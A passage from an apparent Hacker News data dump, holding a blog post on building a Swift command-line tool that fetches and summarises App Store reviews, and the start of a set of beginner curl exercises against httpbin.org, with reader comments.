          "12 Jan 2019I write a lot of custom command line tools that live alongside my projects. The tools vary in complexity and implementation. From simplest to most involved heres my high level implementation strategy: A single file containing a shebang #!/usr/bin/swift. A Swift Package Manager project of type executable. A Swift Package Manager project of type executable that builds using sources from the main project (Ive written about this here). The same as above but special care has been taken to ensure that the tool can be dockerized and run on Linux. The hardest part with writing custom tools is knowing how to get started, this post will run through creating a single file tool. Problem Outline Lets imagine that we want to grab our most recent app store reviews, get a high level overview of star distribution of the recent reviews and look at any comments that have a rating of 3 stars or below. Skeleton Lets start by making sure we can get an executable Swift file. In your terminal you can do the following: echo '#!/usr/bin/swift\\nprint(\"It works!!\")' > reviews chmod u+x reviews ./reviews The result will be It works!! The first line is equivalent to just creating a file called reviews with the following contents #!/usr/bin/swift print(\"It works!!\") Its not the most exciting file but its good enough to get us rolling. The next command chmod u+x reviews makes the file executable and finally we execute it with ./reviews. Now that we have an executable file lets figure out what our data looks like. Source data Before we progress with writing the rest of the script we need to figure out how to get the data, Im going to do this using curl and jq. This is a useful step because it helps me figure out what the structure of the data is and allows me to experiment with the transformations that I need to apply in my tool. First lets checkout the URL that I grabbed from Stack Overflow (for this example Im just using the Apple Support apps id for reviews): curl \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\" To see how this looks I can pretty print it by piping it through jq: curl \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\" \\ | jq . Response structure ``` { \"feed\": { \"author\": { \"name\": { \"label\": \"...\" }, \"uri\": { \"label\": \"...\" } }, \"entry\": [ { \"author\": { \"uri\": { \"label\": \"...\" }, \"name\": { \"label\": \"...\" }, \"label\": \"\" }, \"im:version\": { \"label\": \"...\" }, \"im:rating\": { \"label\": \"...\" }, \"id\": { \"label\": \"...\" }, \"title\": { \"label\": \"...\" }, \"content\": { \"label\": \"...\", \"attributes\": { \"type\": \"text\" } }, \"link\": { \"attributes\": { \"rel\": \"related\", \"href\": \"...\" } }, \"im:voteSum\": { \"label\": \"...\" }, \"im:contentType\": { \"attributes\": { \"term\": \"Application\", \"label\": \"Application\" } }, \"im:voteCount\": { \"label\": \"...\" } } ], \"updated\": { \"label\": \"...\" }, \"rights\": { \"label\": \"...\" }, \"title\": { \"label\": \"...\" }, \"icon\": { \"label\": \"...\" }, \"link\": [ { \"attributes\": { \"rel\": \"...\", \"type\": \"text/html\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"self\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"first\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"last\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"previous\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"next\", \"href\": \"...\" } } ], \"id\": { \"label\": \"...\" } } } ``` Looking at the structure I can see that the data I really care about is under feed.entry so I update my jq filter to scope the data a little better: curl \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\" \\ | jq '.feed.entry' Response structure ``` [ { \"author\": { \"uri\": { \"label\": \"...\" }, \"name\": { \"label\": \"...\" }, \"label\": \"\" }, \"im:version\": { \"label\": \"...\" }, \"im:rating\": { \"label\": \"...\" }, \"id\": { \"label\": \"...\" }, \"title\": { \"label\": \"...\" }, \"content\": { \"label\": \"...\", \"attributes\": { \"type\": \"text\" } }, \"link\": { \"attributes\": { \"rel\": \"related\", \"href\": \"...\" } }, \"im:voteSum\": { \"label\": \"...\" }, \"im:contentType\": { \"attributes\": { \"term\": \"Application\", \"label\": \"Application\" } }, \"im:voteCount\": { \"label\": \"...\" } } ] ``` Finally I pull out the fields that I feel will be important for the tool we are writing: curl \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\" \\ | jq '.feed.entry[] | {title: .title.label, rating: .\"im:rating\".label, comment: .content.label}' Response structure ``` [ { \"title\" : \"...\", \"rating\" : \"...\", \"comment\" : \"...\" } ] ``` This is a really fast way of experimenting with data and as well see later its helpful when we come to write the Swift code. The result of the jq filter above is that the large feed will be reduced down to an array of objects with just the title, rating and comment. At this point Im feeling pretty confident that I know what my data will look like so I can go ahead and write this in Swift. Network Request in swift Well use URLSession to make our request - a first attempt might look like: 1 2 3 4 5 6 7 8 #!/usr/bin/swift import Foundation let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in print(response as Any) }).resume() 2 we need to import Foundation in order to use URLSession and URL. 6 well use the default session as we dont need anything custom. 7 to start well just print anything to check this works. 8 lets not forget to resume the task or nothing will happen. Taking the above we can return to terminal and run ./reviews. nothing happened. The issue here is that dataTask is an asynchronous operation and our script will exit immediately without waiting for the completion to be called. Modifying the code to call dispatchMain() at the end resolves this: #!/usr/bin/swift import Foundation let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in print(response as Any) }).resume() dispatchMain() Heading back to terminal and running ./reviews we should get some output like Optional(41678 bytes) but weve also introduced a new problem - the programme didnt terminate. Lets fix this and then we can crack on with the rest of our tasks: 1 2 3 4 5 6 7 8 9 10 11 #!/usr/bin/swift import Foundation let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in print(response as Any) exit(EXIT_SUCCESS) }).resume() dispatchMain() On line 8 Ive added an exit, well provide different exit codes later on depending on whether the tool succeeded or not. To prepare for the next steps well just add some error handling: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #!/usr/bin/swift import Foundation let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in if let error = error { print(error.localizedDescription) exit(EXIT_FAILURE) } guard let httpResponse = response as? HTTPURLResponse, 200..<300 ~= httpResponse.statusCode else { print(\"Invalid response \\(String(describing: response))\") exit(EXIT_FAILURE) } if let data = data, data.count > 0 { print(data as Any) exit(EXIT_SUCCESS) } else { print(\"No data!!\") exit(EXIT_FAILURE) } }).resume() dispatchMain() Lines 7-10 are covering cases where there is a failure at the task level. Lines 12-15 are covering errors at the http level. Lines 20-23 are covering cases where there is no data returned. The happy path is hidden in lines 17-20. Side note: Depending on the usage of your scripts you may choose to tailor the level of error reporting and decide if things like force unwraps are acceptable. I tend to find its worth putting error handling in as Ill rarely look at this code, so when it goes wrong it will be a pain to debug without some guidance. Parsing the data We can look at the jq filter we created earlier to guide us on what we need to build. jq .feed.entry[] | {title: .title.label, rating: .\"im:rating\".label, comment: .content.label} We need to dive into the JSON through feed and entry - we can do this by mirroring this structure and using Swifts Decodable: struct Response: Decodable { let feed: Feed struct Feed: Decodable { let entry: [Entry] struct Entry: Decodable { } } } In order to decode an Entry well provide a custom implementation of init(from:) - this will allow us to flatten the data e.g. instead of having entry.title.label we end up with just entry.title. We can do this with the following: struct Entry: Decodable { let comment: String let rating: Int let title: String init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) comment = try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .comment).decode(String.self, forKey: .label) rating = Int(try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .rating).decode(String.self, forKey: .label))! title = try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .title).decode(String.self, forKey: .label) } private enum CodingKeys: String, CodingKey { case comment = \"content\" case rating = \"im:rating\" case title case label } } With this done we can wire it all up - well go back to the happy path and add: do { print(try JSONDecoder().decode(Response.self, from: data)) exit(EXIT_SUCCESS) } catch { print(\"Failed to decode - \\(error.localizedDescription)\") exit(EXIT_FAILURE) } Thats the complicated stuff out of the way - the next part is the data manipulation that makes the tool actually useful. Processing the data Lets start by printing a summary of the different star ratings. The high level approach will be to loop over all the reviews and keep a track of how many times each star rating was used. Well then return a string that shows the rating number and then an asterisk to represent the number of ratings. func ratings(entries: [Response.Feed.Entry]) -> String { let countedSet = NSCountedSet() entries.forEach { countedSet.add($0.rating) } return (countedSet.allObjects as! [Int]) .sorted(by: >) .reduce(into: \"\") { result, key in result.append(\"\\(key): \\(String(repeating: \"*\", count: countedSet.count(for: key)))\\n\") } } This will yield output like: 5: ***************** 4: ** 3: * 2: **** 1: ************************** The other task we wanted to do was print all the comments that had a rating of 3 or less. This is the simpler of the two tasks as we just need to filter the entries and then format for printing: func reviews(entries: [Response.Feed.Entry]) -> String { return entries .filter { $0.rating <= 3 } .map({ \"\"\" (\\($0.rating)) - \\($0.title) > \\($0.comment) \"\"\" }).joined(separator: \"\\n\\n-\\n\\n\") } This will yield output like: (3) - Love it > This is my favourite app. Putting it all together we end up with: #!/usr/bin/swift import Foundation struct Response: Decodable { let feed: Feed struct Feed: Decodable { let entry: [Entry] struct Entry: Decodable { let comment: String let rating: Int let title: String init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) comment = try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .comment).decode(String.self, forKey: .label) rating = Int(try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .rating).decode(String.self, forKey: .label))! title = try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .title).decode(String.self, forKey: .label) } private enum CodingKeys: String, CodingKey { case comment = \"content\" case rating = \"im:rating\" case title case label } } } } func ratings(entries: [Response.Feed.Entry]) -> String { let countedSet = NSCountedSet() entries.forEach { countedSet.add($0.rating) } return (countedSet.allObjects as! [Int]) .sorted(by: >) .reduce(into: \"\") { result, key in result.append(\"\\(key): \\(String(repeating: \"*\", count: countedSet.count(for: key)))\\n\") } } func reviews(entries: [Response.Feed.Entry]) -> String { return entries .filter { $0.rating <= 3 } .map({ \"\"\" (\\($0.rating)) - \\($0.title) > \\($0.comment) \"\"\" }).joined(separator: \"\\n\\n-\\n\\n\") } let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in if let error = error { print(error.localizedDescription) exit(EXIT_FAILURE) } guard let httpResponse = response as? HTTPURLResponse, 200..<300 ~= httpResponse.statusCode else { print(\"Invalid response \\(String(describing: response))\") exit(EXIT_FAILURE) } if let data = data, data.count > 0 { do { let entries = try JSONDecoder().decode(Response.self, from: data).feed.entry print(ratings(entries: entries)) print() print(reviews(entries: entries)) exit(EXIT_SUCCESS) } catch { print(\"Failed to decode - \\(error.localizedDescription)\") exit(EXIT_FAILURE) } } else { print(\"No data!!\") exit(EXIT_FAILURE) } }).resume() dispatchMain() Conclusion Creating tools is a lot of fun and isnt as scary as it might seem at first. Weve done networking, data parsing and some data munging all in one file with not too much effort, which is very rewarding. The single file approach is probably best for shorter tasks. In the example above its already becoming unwieldy and it would be worth considering moving to a Swift Package Manager tool (maybe thats a future post). ",
          "Swift tries to be a jack of all trades, but I think as a scripting language (as in this example) it falls short. Having to start a run loop, write asynchronous callbacks (completion handlers), and implement custom JSON decoders just to make a web request is introducing a ton of complexity that might make sense in an event-driven interactive GUI application, but not so much in a quick shell script.<p>Swift tools might be a good choice for use cases where you need to integrate with an existing Swift project, or if you need lower level APIs.<p>In this example, a Bash script would have been almost done by the time you worked out the `curl | jq` command. But in other similar cases I would suggest Python Requests, which will take perhaps 10% as much code and avoid issues of Linux compatibility and mistakes like forgetting to call `resume()` on your download task or `exit()` in some branch (there are five calls just to keep the program from looping forever).<p>That said, I think this blog post is very informative and well-made for a beginner interested in talking to a web-based JSON API from Swift.",
          "I like it, being able to start with a shell script and then evolve the tool to a static binary is pretty neat, I do that all the time with ActionScript<p>I don't think it's trying to be a \"jack of all trades\", sure Bash can do plenty but when you reach few hundred lines of Bash and start to fight against the syntax to do simple things well...<p>The shebang line is there to be used, you can use sh, bash, etc. but there are other citizen like perl, php, python, etc. so why not swift or anything else if it help you build quickly command-line tools?"
        ],
        "story_type": ["Normal"],
        "url": "https://paul-samuels.com/blog/2019/01/12/writing-custom-tools-with-swift/",
        "comments.comment_id": [18898126, 18899738],
        "comments.comment_author": ["rgovostes", "zwetan"],
        "comments.comment_descendants": [6, 0],
        "comments.comment_time": [
          "2019-01-13T19:08:41Z",
          "2019-01-14T00:46:57Z"
        ],
        "comments.comment_text": [
          "Swift tries to be a jack of all trades, but I think as a scripting language (as in this example) it falls short. Having to start a run loop, write asynchronous callbacks (completion handlers), and implement custom JSON decoders just to make a web request is introducing a ton of complexity that might make sense in an event-driven interactive GUI application, but not so much in a quick shell script.<p>Swift tools might be a good choice for use cases where you need to integrate with an existing Swift project, or if you need lower level APIs.<p>In this example, a Bash script would have been almost done by the time you worked out the `curl | jq` command. But in other similar cases I would suggest Python Requests, which will take perhaps 10% as much code and avoid issues of Linux compatibility and mistakes like forgetting to call `resume()` on your download task or `exit()` in some branch (there are five calls just to keep the program from looping forever).<p>That said, I think this blog post is very informative and well-made for a beginner interested in talking to a web-based JSON API from Swift.",
          "I like it, being able to start with a shell script and then evolve the tool to a static binary is pretty neat, I do that all the time with ActionScript<p>I don't think it's trying to be a \"jack of all trades\", sure Bash can do plenty but when you reach few hundred lines of Bash and start to fight against the syntax to do simple things well...<p>The shebang line is there to be used, you can use sh, bash, etc. but there are other citizen like perl, php, python, etc. so why not swift or anything else if it help you build quickly command-line tools?"
        ],
        "id": "b8d48c2c-57ec-46ad-beae-fd1f2ae76434",
        "url_text": "12 Jan 2019I write a lot of custom command line tools that live alongside my projects. The tools vary in complexity and implementation. From simplest to most involved heres my high level implementation strategy: A single file containing a shebang #!/usr/bin/swift. A Swift Package Manager project of type executable. A Swift Package Manager project of type executable that builds using sources from the main project (Ive written about this here). The same as above but special care has been taken to ensure that the tool can be dockerized and run on Linux. The hardest part with writing custom tools is knowing how to get started, this post will run through creating a single file tool. Problem Outline Lets imagine that we want to grab our most recent app store reviews, get a high level overview of star distribution of the recent reviews and look at any comments that have a rating of 3 stars or below. Skeleton Lets start by making sure we can get an executable Swift file. In your terminal you can do the following: echo '#!/usr/bin/swift\\nprint(\"It works!!\")' > reviews chmod u+x reviews ./reviews The result will be It works!! The first line is equivalent to just creating a file called reviews with the following contents #!/usr/bin/swift print(\"It works!!\") Its not the most exciting file but its good enough to get us rolling. The next command chmod u+x reviews makes the file executable and finally we execute it with ./reviews. Now that we have an executable file lets figure out what our data looks like. Source data Before we progress with writing the rest of the script we need to figure out how to get the data, Im going to do this using curl and jq. This is a useful step because it helps me figure out what the structure of the data is and allows me to experiment with the transformations that I need to apply in my tool. First lets checkout the URL that I grabbed from Stack Overflow (for this example Im just using the Apple Support apps id for reviews): curl \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\" To see how this looks I can pretty print it by piping it through jq: curl \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\" \\ | jq . Response structure ``` { \"feed\": { \"author\": { \"name\": { \"label\": \"...\" }, \"uri\": { \"label\": \"...\" } }, \"entry\": [ { \"author\": { \"uri\": { \"label\": \"...\" }, \"name\": { \"label\": \"...\" }, \"label\": \"\" }, \"im:version\": { \"label\": \"...\" }, \"im:rating\": { \"label\": \"...\" }, \"id\": { \"label\": \"...\" }, \"title\": { \"label\": \"...\" }, \"content\": { \"label\": \"...\", \"attributes\": { \"type\": \"text\" } }, \"link\": { \"attributes\": { \"rel\": \"related\", \"href\": \"...\" } }, \"im:voteSum\": { \"label\": \"...\" }, \"im:contentType\": { \"attributes\": { \"term\": \"Application\", \"label\": \"Application\" } }, \"im:voteCount\": { \"label\": \"...\" } } ], \"updated\": { \"label\": \"...\" }, \"rights\": { \"label\": \"...\" }, \"title\": { \"label\": \"...\" }, \"icon\": { \"label\": \"...\" }, \"link\": [ { \"attributes\": { \"rel\": \"...\", \"type\": \"text/html\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"self\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"first\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"last\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"previous\", \"href\": \"...\" } }, { \"attributes\": { \"rel\": \"next\", \"href\": \"...\" } } ], \"id\": { \"label\": \"...\" } } } ``` Looking at the structure I can see that the data I really care about is under feed.entry so I update my jq filter to scope the data a little better: curl \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\" \\ | jq '.feed.entry' Response structure ``` [ { \"author\": { \"uri\": { \"label\": \"...\" }, \"name\": { \"label\": \"...\" }, \"label\": \"\" }, \"im:version\": { \"label\": \"...\" }, \"im:rating\": { \"label\": \"...\" }, \"id\": { \"label\": \"...\" }, \"title\": { \"label\": \"...\" }, \"content\": { \"label\": \"...\", \"attributes\": { \"type\": \"text\" } }, \"link\": { \"attributes\": { \"rel\": \"related\", \"href\": \"...\" } }, \"im:voteSum\": { \"label\": \"...\" }, \"im:contentType\": { \"attributes\": { \"term\": \"Application\", \"label\": \"Application\" } }, \"im:voteCount\": { \"label\": \"...\" } } ] ``` Finally I pull out the fields that I feel will be important for the tool we are writing: curl \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\" \\ | jq '.feed.entry[] | {title: .title.label, rating: .\"im:rating\".label, comment: .content.label}' Response structure ``` [ { \"title\" : \"...\", \"rating\" : \"...\", \"comment\" : \"...\" } ] ``` This is a really fast way of experimenting with data and as well see later its helpful when we come to write the Swift code. The result of the jq filter above is that the large feed will be reduced down to an array of objects with just the title, rating and comment. At this point Im feeling pretty confident that I know what my data will look like so I can go ahead and write this in Swift. Network Request in swift Well use URLSession to make our request - a first attempt might look like: 1 2 3 4 5 6 7 8 #!/usr/bin/swift import Foundation let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in print(response as Any) }).resume() 2 we need to import Foundation in order to use URLSession and URL. 6 well use the default session as we dont need anything custom. 7 to start well just print anything to check this works. 8 lets not forget to resume the task or nothing will happen. Taking the above we can return to terminal and run ./reviews. nothing happened. The issue here is that dataTask is an asynchronous operation and our script will exit immediately without waiting for the completion to be called. Modifying the code to call dispatchMain() at the end resolves this: #!/usr/bin/swift import Foundation let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in print(response as Any) }).resume() dispatchMain() Heading back to terminal and running ./reviews we should get some output like Optional(41678 bytes) but weve also introduced a new problem - the programme didnt terminate. Lets fix this and then we can crack on with the rest of our tasks: 1 2 3 4 5 6 7 8 9 10 11 #!/usr/bin/swift import Foundation let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in print(response as Any) exit(EXIT_SUCCESS) }).resume() dispatchMain() On line 8 Ive added an exit, well provide different exit codes later on depending on whether the tool succeeded or not. To prepare for the next steps well just add some error handling: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 #!/usr/bin/swift import Foundation let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in if let error = error { print(error.localizedDescription) exit(EXIT_FAILURE) } guard let httpResponse = response as? HTTPURLResponse, 200..<300 ~= httpResponse.statusCode else { print(\"Invalid response \\(String(describing: response))\") exit(EXIT_FAILURE) } if let data = data, data.count > 0 { print(data as Any) exit(EXIT_SUCCESS) } else { print(\"No data!!\") exit(EXIT_FAILURE) } }).resume() dispatchMain() Lines 7-10 are covering cases where there is a failure at the task level. Lines 12-15 are covering errors at the http level. Lines 20-23 are covering cases where there is no data returned. The happy path is hidden in lines 17-20. Side note: Depending on the usage of your scripts you may choose to tailor the level of error reporting and decide if things like force unwraps are acceptable. I tend to find its worth putting error handling in as Ill rarely look at this code, so when it goes wrong it will be a pain to debug without some guidance. Parsing the data We can look at the jq filter we created earlier to guide us on what we need to build. jq .feed.entry[] | {title: .title.label, rating: .\"im:rating\".label, comment: .content.label} We need to dive into the JSON through feed and entry - we can do this by mirroring this structure and using Swifts Decodable: struct Response: Decodable { let feed: Feed struct Feed: Decodable { let entry: [Entry] struct Entry: Decodable { } } } In order to decode an Entry well provide a custom implementation of init(from:) - this will allow us to flatten the data e.g. instead of having entry.title.label we end up with just entry.title. We can do this with the following: struct Entry: Decodable { let comment: String let rating: Int let title: String init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) comment = try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .comment).decode(String.self, forKey: .label) rating = Int(try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .rating).decode(String.self, forKey: .label))! title = try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .title).decode(String.self, forKey: .label) } private enum CodingKeys: String, CodingKey { case comment = \"content\" case rating = \"im:rating\" case title case label } } With this done we can wire it all up - well go back to the happy path and add: do { print(try JSONDecoder().decode(Response.self, from: data)) exit(EXIT_SUCCESS) } catch { print(\"Failed to decode - \\(error.localizedDescription)\") exit(EXIT_FAILURE) } Thats the complicated stuff out of the way - the next part is the data manipulation that makes the tool actually useful. Processing the data Lets start by printing a summary of the different star ratings. The high level approach will be to loop over all the reviews and keep a track of how many times each star rating was used. Well then return a string that shows the rating number and then an asterisk to represent the number of ratings. func ratings(entries: [Response.Feed.Entry]) -> String { let countedSet = NSCountedSet() entries.forEach { countedSet.add($0.rating) } return (countedSet.allObjects as! [Int]) .sorted(by: >) .reduce(into: \"\") { result, key in result.append(\"\\(key): \\(String(repeating: \"*\", count: countedSet.count(for: key)))\\n\") } } This will yield output like: 5: ***************** 4: ** 3: * 2: **** 1: ************************** The other task we wanted to do was print all the comments that had a rating of 3 or less. This is the simpler of the two tasks as we just need to filter the entries and then format for printing: func reviews(entries: [Response.Feed.Entry]) -> String { return entries .filter { $0.rating <= 3 } .map({ \"\"\" (\\($0.rating)) - \\($0.title) > \\($0.comment) \"\"\" }).joined(separator: \"\\n\\n-\\n\\n\") } This will yield output like: (3) - Love it > This is my favourite app. Putting it all together we end up with: #!/usr/bin/swift import Foundation struct Response: Decodable { let feed: Feed struct Feed: Decodable { let entry: [Entry] struct Entry: Decodable { let comment: String let rating: Int let title: String init(from decoder: Decoder) throws { let container = try decoder.container(keyedBy: CodingKeys.self) comment = try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .comment).decode(String.self, forKey: .label) rating = Int(try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .rating).decode(String.self, forKey: .label))! title = try container.nestedContainer(keyedBy: CodingKeys.self, forKey: .title).decode(String.self, forKey: .label) } private enum CodingKeys: String, CodingKey { case comment = \"content\" case rating = \"im:rating\" case title case label } } } } func ratings(entries: [Response.Feed.Entry]) -> String { let countedSet = NSCountedSet() entries.forEach { countedSet.add($0.rating) } return (countedSet.allObjects as! [Int]) .sorted(by: >) .reduce(into: \"\") { result, key in result.append(\"\\(key): \\(String(repeating: \"*\", count: countedSet.count(for: key)))\\n\") } } func reviews(entries: [Response.Feed.Entry]) -> String { return entries .filter { $0.rating <= 3 } .map({ \"\"\" (\\($0.rating)) - \\($0.title) > \\($0.comment) \"\"\" }).joined(separator: \"\\n\\n-\\n\\n\") } let url = URL(string: \"https://itunes.apple.com/gb/rss/customerreviews/id=1130498044/sortBy=mostRecent/json\")! URLSession.shared.dataTask(with: url, completionHandler: { data, response, error in if let error = error { print(error.localizedDescription) exit(EXIT_FAILURE) } guard let httpResponse = response as? HTTPURLResponse, 200..<300 ~= httpResponse.statusCode else { print(\"Invalid response \\(String(describing: response))\") exit(EXIT_FAILURE) } if let data = data, data.count > 0 { do { let entries = try JSONDecoder().decode(Response.self, from: data).feed.entry print(ratings(entries: entries)) print() print(reviews(entries: entries)) exit(EXIT_SUCCESS) } catch { print(\"Failed to decode - \\(error.localizedDescription)\") exit(EXIT_FAILURE) } } else { print(\"No data!!\") exit(EXIT_FAILURE) } }).resume() dispatchMain() Conclusion Creating tools is a lot of fun and isnt as scary as it might seem at first. Weve done networking, data parsing and some data munging all in one file with not too much effort, which is very rewarding. The single file approach is probably best for shorter tasks. In the example above its already becoming unwieldy and it would be worth considering moving to a Swift Package Manager tool (maybe thats a future post). ",
        "_version_": 1718527381888565249
      },
      {
        "story_id": [20811829],
        "story_author": ["weinzierl"],
        "story_descendants": [59],
        "story_score": [273],
        "story_time": ["2019-08-27T16:54:20Z"],
        "story_title": "Curl exercises",
        "search": [
          "Curl exercises",
          "https://jvns.ca/blog/2019/08/27/curl-exercises/",
          "Recently Ive been interested in how people learn things. I was reading Kathy Sierras great book Badass: Making Users Awesome. It talks about the idea of deliberate practice. The idea is that you find a small micro-skill that can be learned in maybe 3 sessions of 45 minutes, and focus on learning that micro-skill. So, as an exercise, I was trying to think of a computer skill that I thought could be learned in 3 45-minute sessions. I thought that making HTTP requests with curl might be a skill like that, so here are some curl exercises as an experiment! whats curl? curl is a command line tool for making HTTP requests. I like it because its an easy way to test that servers or APIs are doing what I think, but its a little confusing at first! Heres a drawing explaining curls most important command line arguments (which is page 6 of my Bite Size Networking zine). You can click to make it bigger. fluency is valuable With any command line tool, I think having fluency is really helpful. Its really nice to be able to just type in the thing you need. For example recently I was testing out the Gumroad API and I was able to just type in: curl https://api.gumroad.com/v2/sales \\ -d \"access_token=<SECRET>\" \\ -X GET -d \"before=2016-09-03\" and get things working from the command line. 21 curl exercises These exercises are about understanding how to make different kinds of HTTP requests with curl. Theyre a little repetitive on purpose. They exercise basically everything I do with curl. To keep it simple, were going to make a lot of our requests to the same website: https://httpbin.org. httpbin is a service that accepts HTTP requests and then tells you what request you made. Request https://httpbin.org Request https://httpbin.org/anything. httpbin.org/anything will look at the request you made, parse it, and echo back to you what you requested. curls default is to make a GET request. Make a POST request to https://httpbin.org/anything Make a GET request to https://httpbin.org/anything, but this time add some query parameters (set value=panda). Request googles robots.txt file (www.google.com/robots.txt) Make a GET request to https://httpbin.org/anything and set the header User-Agent: elephant. Make a DELETE request to https://httpbin.org/anything Request https://httpbin.org/anything and also get the response headers Make a POST request to https://httpbin.org/anything with the JSON body {\"value\": \"panda\"} Make the same POST request as the previous exercise, but set the Content-Type header to application/json (because POST requests need to have a content type that matches their body). Look at the json field in the response to see the difference from the previous one. Make a GET request to https://httpbin.org/anything and set the header Accept-Encoding: gzip (what happens? why?) Put a bunch of a JSON in a file and then make a POST request to https://httpbin.org/anything with the JSON in that file as the body Make a request to https://httpbin.org/image and set the header Accept: image/png. Save the output to a PNG file and open the file in an image viewer. Try the same thing with different Accept: headers. Make a PUT request to https://httpbin.org/anything Request https://httpbin.org/image/jpeg, save it to a file, and open that file in your image editor. Request https://www.twitter.com. Youll get an empty response. Get curl to show you the response headers too, and try to figure out why the response was empty. Make any request to https://httpbin.org/anything and just set some nonsense headers (like panda: elephant) Request https://httpbin.org/status/404 and https://httpbin.org/status/200. Request them again and get curl to show the response headers. Request https://httpbin.org/anything and set a username and password (with -u username:password) Download the Twitter homepage (https://twitter.com) in Spanish by setting the Accept-Language: es-ES header. Make a request to the Stripe API with curl. (see https://stripe.com/docs/development for how, they give you a test API key). Try making exactly the same request to https://httpbin.org/anything. ",
          "I really like using HTTPie (<a href=\"https://httpie.org\" rel=\"nofollow\">https://httpie.org</a>). Much friendlier syntax then curl, formats the output...<p>Also works great with fx (<a href=\"https://github.com/antonmedv/fx\" rel=\"nofollow\">https://github.com/antonmedv/fx</a>). Just pipe the output from HTTPie and you get easy json processing.",
          "This is more SysAdmin related, but one power-curl function I use atleast 30 times a day is this alias I have in my .bash_aliases<p>This will output the HTTP status code for a given URL.<p><pre><code>     alias hstat=\"curl -o /dev/null --silent --head --write-out '%{http_code}\\n'\" $1  \n</code></pre>\nExample:<p><pre><code>  $ hstat google.com\n  301\n</code></pre>\nI also use curl as an 'uptime monitor' by adding onto that code section.  (a file with a list of URLs, and \"if http status code !=200\" then email me.)<p>There are variations on this all over the place but I really depend on it and I like it."
        ],
        "story_type": ["Normal"],
        "url": "https://jvns.ca/blog/2019/08/27/curl-exercises/",
        "url_text": "Recently Ive been interested in how people learn things. I was reading Kathy Sierras great book Badass: Making Users Awesome. It talks about the idea of deliberate practice. The idea is that you find a small micro-skill that can be learned in maybe 3 sessions of 45 minutes, and focus on learning that micro-skill. So, as an exercise, I was trying to think of a computer skill that I thought could be learned in 3 45-minute sessions. I thought that making HTTP requests with curl might be a skill like that, so here are some curl exercises as an experiment! whats curl? curl is a command line tool for making HTTP requests. I like it because its an easy way to test that servers or APIs are doing what I think, but its a little confusing at first! Heres a drawing explaining curls most important command line arguments (which is page 6 of my Bite Size Networking zine). You can click to make it bigger. fluency is valuable With any command line tool, I think having fluency is really helpful. Its really nice to be able to just type in the thing you need. For example recently I was testing out the Gumroad API and I was able to just type in: curl https://api.gumroad.com/v2/sales \\ -d \"access_token=<SECRET>\" \\ -X GET -d \"before=2016-09-03\" and get things working from the command line. 21 curl exercises These exercises are about understanding how to make different kinds of HTTP requests with curl. Theyre a little repetitive on purpose. They exercise basically everything I do with curl. To keep it simple, were going to make a lot of our requests to the same website: https://httpbin.org. httpbin is a service that accepts HTTP requests and then tells you what request you made. Request https://httpbin.org Request https://httpbin.org/anything. httpbin.org/anything will look at the request you made, parse it, and echo back to you what you requested. curls default is to make a GET request. Make a POST request to https://httpbin.org/anything Make a GET request to https://httpbin.org/anything, but this time add some query parameters (set value=panda). Request googles robots.txt file 